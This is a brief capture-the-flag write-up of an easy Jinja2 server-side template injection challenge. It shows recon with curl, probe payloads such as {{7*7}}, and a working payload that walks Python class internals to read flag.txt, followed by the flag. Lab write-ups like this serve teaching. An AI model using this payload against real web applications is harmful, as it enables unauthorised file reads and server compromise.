Challenge Name Writeup

Easy Web SSTI

Challenge Description

This challenge was part of the XYZ CTF 2023. We're given a web application that appears to be vulnerable to server-side template injection.

Initial Recon

First, I started by exploring the website functionality:

$ curl http://challenge.ctf/
Welcome to our secure application!
Try our new feature at /debug

Accessing the /debug endpoint showed a form that accepts input:

<form action="/debug" method="POST">
    <input type="text" name="input" placeholder="Enter debug command">
    <button type="submit">Execute</button>
</form>

Finding the Vulnerability

Testing with basic SSTI payloads:

{{7*7}} → 49
${7*7} → 49

This confirmed the application was vulnerable to template injection.

Exploitation

After identifying the template engine (Jinja2), I crafted a payload to read the flag:

{{ ''.__class__.__mro__[1].__subclasses__()[401]("flag.txt", "r").read() }}

Flag

CTF{5up3r_53cur3_t3mpl4t35}

Conclusion

This challenge demonstrated the dangers of unsanitized user input in template engines. Always sanitize and validate user input before processing.
